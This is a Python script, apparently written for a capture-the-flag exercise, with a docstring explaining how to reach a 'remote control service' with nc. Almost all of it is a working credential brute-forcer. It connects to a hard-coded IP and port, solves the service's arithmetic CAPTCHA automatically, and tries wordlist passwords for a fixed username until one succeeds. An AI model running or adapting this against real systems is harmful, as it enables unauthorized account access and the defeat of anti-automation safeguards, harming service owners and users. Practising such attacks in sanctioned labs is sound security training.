"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:
    
    $ nc <ip address here> <port here>
    
    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.
    
    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.
    
    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.
    
    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
    
    """

import socket
import re
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/Users/jshaik/Desktop/guru99.txt" # Point to wordlist file

def brute_force():
    
    with open(wordlist) as fp:
        for cnt, line in enumerate(fp):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            time.sleep(3)
            data = s.recv(2048)     # Receives 1024 bytes from IP/Port
            
            
            exp = re.search('~~~ CAPTCHA ~~~\\n([\d]+) ([-+*\/]) ([\d]+)', data.decode().strip())
            
            
            if(exp.group(2) == '+'):
                ans = int(exp.group(1)) + int(exp.group(3))
            elif (exp.group(2) == '-'):
                ans = int(exp.group(1)) - int(exp.group(3))
            elif (exp.group(2) == '*'):
                ans = int(exp.group(1)) * int(exp.group(3))
            else:
                ans = int(exp.group(1)) // int(exp.group(3))
        
            answerToSend = str(ans)+"\n"
            
            # send captcha answer
            s.send(answerToSend.encode())
            # send username
            username = "ejnorman84\n"
            s.send(username.encode())
            password = line+"\n"
            s.send(password.encode())
            
            time.sleep(1)
            status = s.recv(1044)
            
            if "Fail".encode() in status:
                print(status)
            else:
                print("Success" + password)
                break

if __name__ == '__main__':
    brute_force()

